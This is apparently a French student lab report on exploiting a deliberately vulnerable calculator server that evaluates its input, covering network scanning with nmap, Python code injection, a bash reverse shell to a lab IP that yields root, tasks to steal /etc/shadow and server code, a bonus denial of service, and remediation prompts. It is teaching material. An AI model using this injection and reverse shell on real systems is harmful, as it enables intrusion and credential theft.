# TP5 : Exploit, pwn, fix

## Sommaire

- [TP5 : Exploit, pwn, fix](#tp5--exploit-pwn-fix)
  - [Sommaire](#sommaire)
  - [0. Setup](#0-setup)
  - [1. Reconnaissance](#1-reconnaissance)
  - [2. Exploit](#2-exploit)
  - [3. Reverse shell](#3-reverse-shell)
  - [4. Bonus : DOS](#4-bonus--dos)
  - [II. Remédiation](#ii-remédiation)

## 1. Reconnaissance

🌞 **Déterminer**

Ip : 10.1.2.12
Port : 13337

Wireshark !!

🌞 **Scanner le réseau**

```bash
$ sudo nmap 10.33.76.225/20 -sS -p13337 --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-30 10:52 CET
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.33.66.165
Host is up (0.020s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: 56:4C:81:26:BF:C8 (Unknown)

Nmap scan report for 10.33.70.40
Host is up (0.066s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: E4:B3:18:48:36:68 (Intel Corporate)

Nmap scan report for 10.33.76.195
Host is up (0.0081s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: 82:30:BF:B6:57:2F (Unknown)

Nmap scan report for 10.33.76.217
Host is up (0.0080s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: 2C:6D:C1:5E:41:6A (Intel Corporate)

Nmap done: 4096 IP addresses (872 hosts up) scanned in 232.14 seconds
```

Wireshark

🌞 **Connectez-vous au serveur**

```bash
$ python3 client.py 
Veuillez saisir une opération arithmétique : 1+1
$ cat /var/log/bs_client/bs_client.log

2023-11-30 11:03:34 INFO Connexion réussie à 10.33.76.217:13337
2023-11-30 11:03:36 INFO Message envoyé au serveur 10.33.76.217 : 1+1
2023-11-30 11:03:36 INFO Réponse reçue du serveur 10.33.76.217 : b'2'
```

## 2. Exploit

Host : 10.33.76.217
port : 13337

```BASH
$ python3 client.py 
Veuillez saisir une opération arithmétique : __import__('os').system('ping 10.33.76.225')
```

capture

🌞 **Injecter du code serveur**

- démerdez-vous pour arriver à faire exécuter du code arbitraire au serveur
- tu sais comment te co au serveur, et tu sais que ce que tu lui envoies, il l'évalue
- vous pouvez normalement avoir une injection de code :
  - exécuter du code Python
  - et normalement, exécuter des commandes shell depuis cette injection Python

## 3. Reverse shell

➜ **Injecter du code c'est bien mais...**

```bash
__import__('os').system('sh -i >& /dev/tcp/10.33.76.225/5555 0>&1')

sh-5.1# whoami 
whoami
root

sh-5.1# ps -ef
ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 12:00 ?        00:00:00 /usr/lib/systemd/systemd --switched-root --system --deserialize 31
root           2       0  0 12:00 ?        00:00:00 [kthreadd]
root           3       2  0 12:00 ?        00:00:00 [rcu_gp]
root           4       2  0 12:00 ?        00:00:00 [rcu_par_gp]
root           5       2  0 12:00 ?        00:00:00 [slub_flushwq]
root           6       2  0 12:00 ?        00:00:00 [netns]
root           8       2  0 12:00 ?        00:00:00 [kworker/0:0H-events_highpri]
root          10       2  0 12:00 ?        00:00:00 [kworker/0:1H-events_highpri]
root          11       2  0 12:00 ?        00:00:00 [mm_percpu_wq]
root          12       2  0 12:00 ?        00:00:00 [kworker/u2:1-events_unbound]
root          13       2  0 12:00 ?        00:00:00 [rcu_tasks_kthre]
root          14       2  0 12:00 ?        00:00:00 [rcu_tasks_rude_]
root          15       2  0 12:00 ?        00:00:00 [rcu_tasks_trace]
root          16       2  0 12:00 ?        00:00:00 [ksoftirqd/0]
root          17       2  0 12:00 ?        00:00:00 [rcu_preempt]
root          18       2  0 12:00 ?        00:00:00 [migration/0]
root          20       2  0 12:00 ?        00:00:00 [cpuhp/0]
root          22       2  0 12:00 ?        00:00:00 [kdevtmpfs]
root          23       2  0 12:00 ?        00:00:00 [inet_frag_wq]
root          24       2  0 12:00 ?        00:00:00 [kauditd]
root          25       2  0 12:00 ?        00:00:00 [khungtaskd]
root          26       2  0 12:00 ?        00:00:00 [oom_reaper]
root          27       2  0 12:00 ?        00:00:00 [kworker/u2:2-events_unbound]
root          28       2  0 12:00 ?        00:00:00 [writeback]
root          29       2  0 12:00 ?        00:00:00 [kcompactd0]
root          30       2  0 12:00 ?        00:00:00 [ksmd]
root          31       2  0 12:00 ?        00:00:00 [khugepaged]
root          32       2  0 12:00 ?        00:00:00 [cryptd]
root          33       2  0 12:00 ?        00:00:00 [kintegrityd]
root          34       2  0 12:00 ?        00:00:00 [kblockd]
root          35       2  0 12:00 ?        00:00:00 [blkcg_punt_bio]
root          36       2  0 12:00 ?        00:00:00 [tpm_dev_wq]
root          37       2  0 12:00 ?        00:00:00 [md]
root          38       2  0 12:00 ?        00:00:00 [edac-poller]
root          39       2  0 12:00 ?        00:00:00 [watchdogd]
root          40       2  0 12:00 ?        00:00:00 [kswapd0]
root          45       2  0 12:00 ?        00:00:00 [kthrotld]
root          49       2  0 12:00 ?        00:00:00 [acpi_thermal_pm]
root          50       2  0 12:00 ?        00:00:00 [kmpath_rdacd]
root          51       2  0 12:00 ?        00:00:00 [kaluad]
root          52       2  0 12:00 ?        00:00:00 [kworker/0:2-mm_percpu_wq]
root          53       2  0 12:00 ?        00:00:00 [mld]
root          54       2  0 12:00 ?        00:00:00 [ipv6_addrconf]
root          55       2  0 12:00 ?        00:00:00 [kstrp]
root          67       2  0 12:00 ?        00:00:00 [zswap-shrink]
root         186       2  0 12:00 ?        00:00:00 [kworker/u3:0]
root         388       2  0 12:00 ?        00:00:00 [ata_sff]
root         389       2  0 12:00 ?        00:00:00 [scsi_eh_0]
root         390       2  0 12:00 ?        00:00:00 [scsi_tmf_0]
root         391       2  0 12:00 ?        00:00:00 [scsi_eh_1]
root         392       2  0 12:00 ?        00:00:00 [scsi_eh_2]
root         393       2  0 12:00 ?        00:00:00 [scsi_tmf_2]
root         394       2  0 12:00 ?        00:00:00 [scsi_tmf_1]
root         395       2  0 12:00 ?        00:00:00 [kworker/u2:4-writeback]
root         403       2  0 12:00 ?        00:00:00 [kworker/0:3-events_power_efficient]
root         473       2  0 12:00 ?        00:00:00 [kdmflush/253:0]
root         480       2  0 12:00 ?        00:00:00 [kdmflush/253:1]
root         498       2  0 12:00 ?        00:00:00 [xfsalloc]
root         499       2  0 12:00 ?        00:00:00 [xfs_mru_cache]
root         500       2  0 12:00 ?        00:00:00 [xfs-buf/dm-0]
root         501       2  0 12:00 ?        00:00:00 [xfs-conv/dm-0]
root         502       2  0 12:00 ?        00:00:00 [xfs-reclaim/dm-]
root         503       2  0 12:00 ?        00:00:00 [xfs-blockgc/dm-]
root         504       2  0 12:00 ?        00:00:00 [xfs-inodegc/dm-]
root         505       2  0 12:00 ?        00:00:00 [xfs-log/dm-0]
root         506       2  0 12:00 ?        00:00:00 [xfs-cil/dm-0]
root         507       2  0 12:00 ?        00:00:00 [xfsaild/dm-0]
root         570       1  0 12:00 ?        00:00:00 /usr/lib/systemd/systemd-journald
root         584       1  0 12:00 ?        00:00:00 /usr/lib/systemd/systemd-udevd
root         616       2  0 12:00 ?        00:00:00 [xfs-buf/sda1]
root         617       2  0 12:00 ?        00:00:00 [xfs-conv/sda1]
root         618       2  0 12:00 ?        00:00:00 [xfs-reclaim/sda]
root         620       2  0 12:00 ?        00:00:00 [xfs-blockgc/sda]
root         621       2  0 12:00 ?        00:00:00 [xfs-inodegc/sda]
root         622       2  0 12:00 ?        00:00:00 [xfs-log/sda1]
root         623       2  0 12:00 ?        00:00:00 [xfs-cil/sda1]
root         624       2  0 12:00 ?        00:00:00 [xfsaild/sda1]
root         636       1  0 12:00 ?        00:00:00 /sbin/auditd
root         662       1  0 12:00 ?        00:00:00 /usr/bin/python3 -s /usr/sbin/firewalld --nofork --nopid
root         663       1  0 12:00 ?        00:00:00 /usr/sbin/rsyslogd -n
root         667       1  0 12:00 ?        00:00:00 /usr/lib/systemd/systemd-logind
chrony       669       1  0 12:00 ?        00:00:00 /usr/sbin/chronyd -F 2
dbus         674       1  0 12:00 ?        00:00:00 /usr/bin/dbus-broker-launch --scope system --audit
dbus         675     674  0 12:00 ?        00:00:00 dbus-broker --log 4 --controller 9 --machine-id 2be0dbf715d243219c67fc617ced3912 --max-bytes 536870912 --max-fds 4096 --max-matches 131072 --audit
root         678       2  0 12:00 ?        00:00:00 [irq/18-vmwgfx]
root         679       2  0 12:00 ?        00:00:00 [card0-crtc0]
root         681       2  0 12:00 ?        00:00:00 [card0-crtc1]
root         683       2  0 12:00 ?        00:00:00 [card0-crtc2]
root         684       2  0 12:00 ?        00:00:00 [card0-crtc3]
root         687       2  0 12:00 ?        00:00:00 [card0-crtc4]
root         689       2  0 12:00 ?        00:00:00 [card0-crtc5]
root         690       2  0 12:00 ?        00:00:00 [card0-crtc6]
root         691       2  0 12:00 ?        00:00:00 [card0-crtc7]
root         693       1  0 12:00 ?        00:00:00 /usr/sbin/NetworkManager --no-daemon
root         701       1  0 12:00 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         708       1  0 12:00 ?        00:00:00 /usr/sbin/crond -n
root         709       1  0 12:00 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear - linux
root         712       1  0 12:00 ?        00:00:00 /usr/lib/systemd/systemd-journald netdata
netdata      718       1  0 12:00 ?        00:00:06 /usr/sbin/netdata -P /run/netdata/netdata.pid -D
netdata      743     718  0 12:00 ?        00:00:00 /usr/sbin/netdata --special-spawn-server
netdata      969     718  0 12:00 ?        00:00:00 bash /usr/libexec/netdata/plugins.d/tc-qos-helper.sh 1
netdata      971     718  0 12:00 ?        00:00:04 /usr/libexec/netdata/plugins.d/apps.plugin 1
netdata      975     718  0 12:00 ?        00:00:00 /usr/libexec/netdata/plugins.d/debugfs.plugin 1
root         977     718  0 12:00 ?        00:00:01 /usr/libexec/netdata/plugins.d/ebpf.plugin 1
netdata      979     718  0 12:00 ?        00:00:01 /usr/libexec/netdata/plugins.d/go.d.plugin 1
netdata      987     718  0 12:00 ?        00:00:00 /usr/libexec/netdata/plugins.d/systemd-journal.plugin 1
root        1721     701  0 12:02 ?        00:00:00 sshd: joris [priv]
joris       1726       1  0 12:02 ?        00:00:00 /usr/lib/systemd/systemd --user
joris       1728    1726  0 12:02 ?        00:00:00 (sd-pam)
joris       1735    1721  0 12:02 ?        00:00:00 sshd: joris@pts/0
joris       1736    1735  0 12:02 pts/0    00:00:00 -bash
root        1842       1  0 12:05 ?        00:00:00 /usr/bin/python /opt/calculatrice/server.py
root        1847    1842  0 12:05 ?        00:00:00 sh -c sh -i >& /dev/tcp/10.33.76.225/5555 0>&1
root        1848    1847  0 12:05 ?        00:00:00 sh -i
root        1871       2  0 12:11 ?        00:00:00 [kworker/0:1-events_freezable_power_]
root        1917       2  0 12:17 ?        00:00:00 [kworker/0:0-mm_percpu_wq]
root        1924    1848  0 12:19 ?        00:00:00 ps -ef

sh-5.1# ps -ef | grep calculatrice
ps -ef | grep calculatrice
root        1842       1  0 12:05 ?        00:00:00 /usr/bin/python /opt/calculatrice/server.py
root        1906    1848  0 12:15 ?        00:00:00 grep calculatrice
```

🌞 **Pwn**

- voler les fichiers `/etc/shadow` et `/etc/passwd`
- voler le code serveur de l'application
- déterminer si d'autres services sont disponibles sur la machine

## 4. Bonus : DOS

Le DOS dans l'esprit, souvent c'est :

- d'abord t'es un moldu et tu trouves ça incroyable
- tu deviens un tech, tu te rends compte que c'est pas forcément si compliqué, ptet tu essaies
- tu deviens meilleur et tu te dis que c'est super lame, c'est nul techniquement, ça mène à rien, exploit c'est mieux
- tu deviens conscient, et ptet que parfois, des situations t'amèneront à trouver finalement le principe pas si inutile (politique ? militantisme ?)

⭐ **BONUS : DOS l'application**

- faut que le service soit indispo, d'une façon ou d'une autre
- fais le crash, fais le sleep, fais le s'arrêter, peu importe

## II. Remédiation

🌞 **Proposer une remédiation dév**

- le code serveur ne doit pas exécuter n'importe quoi
- il faut préserver la fonctionnalité de l'outil

🌞 **Proposer une remédiation système**

- l'environnement dans lequel tourne le service est foireux (le user utilisé ?)
- la machine devrait bloquer les connexions sortantes (pas de reverse shell possible)

